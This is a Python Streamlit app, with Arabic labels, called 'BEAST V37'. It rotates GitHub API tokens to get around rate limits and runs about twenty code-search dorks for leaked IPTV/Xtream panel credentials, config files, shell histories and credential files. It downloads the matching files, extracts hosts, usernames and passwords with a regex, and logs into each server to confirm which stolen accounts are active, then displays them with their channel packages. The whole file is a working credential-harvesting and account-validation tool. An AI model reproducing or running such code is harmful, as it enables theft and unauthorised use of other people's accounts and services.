import streamlit as st
import requests
import re
import time
from datetime import datetime

# --- إعدادات الواجهة ---
st.set_page_config(page_title="BEAST V37 - ULTIMATE", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V37 - ULTIMATE EXPANSION</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- تنسيق الألوان (هوية الهاكر) ---
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 11px; margin: 0; }
    .active-hit { 
        background: #0d1117; border: 2px solid #00ff41; 
        padding: 15px; border-radius: 10px; margin-bottom: 10px;
        box-shadow: 0 0 15px rgba(0,255,65,0.2);
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; font-weight: bold; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# --- الجانب الجانبي ---
with st.sidebar:
    st.title("⚡ BEAST V37")
    tokens_area = st.text_area("ضع التوكنات هنا (كل توكن في سطر):", height=150)
    tokens = [t.strip() for t in tokens_area.split('\n') if t.strip()]
    
    st.divider()
    pages_limit = st.number_input("عدد الصفحات لكل دروك (1-100):", min_value=1, max_value=100, value=30)
    start_hunt = st.button("🚀 إطلاق الهجوم الشامل")
    
    if tokens:
        st.success(f"تم تفعيل {len(tokens)} توكنات")

# --- مناطق العرض ---
st.subheader("📡 رادار المسح الشامل (Dorking & Scanning)")
radar_area = st.empty() 

st.subheader("🏆 النتائج المكتشفة (Hits)")
hits_area = st.container()

# --- المحرك العملاق ---
if start_hunt and tokens:
    found_count = 0
    t_idx = 0
    
    # قائمة دروكات ضخمة ومتنوعة (أكثر من 20 نوع)
    mega_dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        'extension:env "XTREAM_HOST" "XTREAM_USER"',
        'extension:json "server_url" "password"',
        'extension:log "http://" "username=" "password="',
        'filename:config.php "db_user" "db_pass" "http"',
        'filename:settings.py "XTREAM"',
        'extension:sh "curl" "username=" "password="',
        '"beIN" "get.php?username="',
        '"OSN" "player_api.php"',
        '"SSC" "http://" "password="',
        'path:etc/php "username=" "password="',
        'extension:m3u8 "http" "username="',
        'filename:.bash_history "get.php"',
        'extension:cfg "xtream" "port"',
        'extension:conf "server_url"',
        'filename:credentials.txt "http"',
        'extension:xml "xtream" "user"',
        'filename:info.txt "username=" "password=" "http"'
    ]
    
    for dork in mega_dorks:
        for page in range(1, pages_limit + 1):
            # تبديل التوكن لكل صفحة لضمان عدم الحظر
            current_token = tokens[t_idx % len(tokens)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                # محاولة البحث
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(search_url, headers=headers).json()
                
                if "items" not in res:
                    radar_area.warning(f"⚠️ توكن رقم {t_idx+1} وصل للحد الأقصى! يتم التبديل...")
                    t_idx += 1
                    time.sleep(1)
                    continue

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        # فلتر استخراج الروابط (Regex المطور)
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            radar_area.markdown(f"<p class='scan-log'>🔍 فحص: {host}...</p>", unsafe_allow_html=True)
                            
                            try:
                                # فحص حالة السيرفر
                                api = f"{host}/player_api.php?username={user}&password={pw}"
                                check = requests.get(api, timeout=2).json()
                                
                                if check.get("user_info", {}).get("status") == "Active":
                                    # جلب عينة من الباقات للتأكد
                                    cats = requests.get(f"{api}&action=get_live_categories", timeout=2).json()
                                    cat_names = [c['category_name'] for c in cats[:10]] if isinstance(cats, list) else ["No Categories"]
                                    
                                    found_count += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ سيرفر شغّال #{found_count}</span><br>
                                            <span class="text-white">HOST: {host}</span><br>
                                            <span class="text-yellow">USER: {user} | PASS: {pw}</span><br>
                                            <div style="color:#888; font-size:11px; margin-top:5px;">
                                                📦 الباقات: {" | ".join(cat_names)}
                                            </div>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except:
                t_idx += 1
                continue
